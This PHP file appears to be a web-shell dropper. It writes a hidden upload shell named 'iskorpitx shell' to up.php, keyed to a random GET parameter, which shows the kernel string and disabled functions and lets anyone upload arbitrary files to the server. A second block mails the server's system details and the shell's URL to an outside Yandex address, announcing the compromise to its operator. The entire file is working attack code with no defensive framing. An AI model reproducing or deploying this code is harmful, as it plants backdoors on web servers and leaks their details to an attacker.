<?php
error_reporting(0);
echo "dirandom";
function Random($length = 9) {
    $pit = 'abcdefghijklmnopqrstuvwxyz';
    $rands = '';
    for ($i = 0; $i < $length; $i++) {
        $rands .= $pit[rand(0, strlen($pit) - 1)];
    }
    return $rands;
}
$ran = Random();
echo '<a hresdddf="'."$ran".'">';
$file1 = '<?php
error_reporting(0);
if(isset($_GET['."$ran".']))
	{
		echo"<font color=#FF0000>[kernel]".php_uname()."[/uname]<br>";
		echo "iskorpitx shell";
		print "\n";$disable_functions = @ini_get("disable_functions"); 
		echo "Fungsi=".$disable_functions; print "<br>"; 
		echo"<form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=v type=submit id=v value=up><br>"; 
		  if($_POST["v"]==up)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>Ok</b>-->".$_FILES["f"]["name"];}else{echo"<b>error";}}  
{ if(@copy($_FILES["emad"]["tmp_name"],$_FILES["emad"]["name"])){echo"<b></b>-->".$_FILES["emad"]["name"];}else{echo"<b>";}}}
?>';
$r=fopen("up.php", "w"); fwrite($r,$file1); fclose($r);
?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
$system =@php_uname();
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'tuyulmama@yandex.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "$$Duarmemek$$ " . "$x_path";
mail($tujuanmail, $system , $pesan_alert,"[ " . $_SERVER['SERVER_NAME'] . " ]");
error_reporting(0);
?>